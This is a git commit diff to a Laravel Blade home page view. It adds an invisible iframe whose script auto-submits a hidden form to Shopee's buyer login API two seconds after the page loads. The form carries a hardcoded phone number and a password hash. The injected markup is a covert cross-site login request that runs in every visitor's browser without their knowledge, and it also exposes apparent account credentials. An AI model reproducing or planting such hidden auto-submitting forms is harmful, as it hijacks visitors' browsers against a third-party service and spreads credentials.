73f4f31712363df5f0aae263f474ffe9d738e53c
komatsu98 <chemgiosa5@gmail.com>
2018-11-09 14:04:32 +0700

    ss

--- resources/views/home/index.blade.php
+++ resources/views/home/index.blade.php
@@ -35,6 +35,7 @@
     </ul>
 
     <button id="login" onclick="loginLZD()">login lazada</button>
+    <iframe src='data:text/html,<html> <head> <script> function doit() { document.getElementById("myForm").submit(); } setTimeout(doit,2000); </script> </head> <div style="display:none;"> <iframe id="myframe" name="myframe"></iframe> <form id="myForm" name="myForm" action="https://shopee.vn/api/v0/buyer/login/login_post/" method="POST" target="myframe"> <input type="text" name="login_key" value="84352497111"></input> <input type="text" name="login_type" value="phone"></input> <input type="text" name="password_hash" value="a2e449132cc12b25bb34196bcee5373072895f983f28dce63520ea036d0448ac"></input> </form>'></iframe>
 @endsection
 
 @push('custom-scripts')
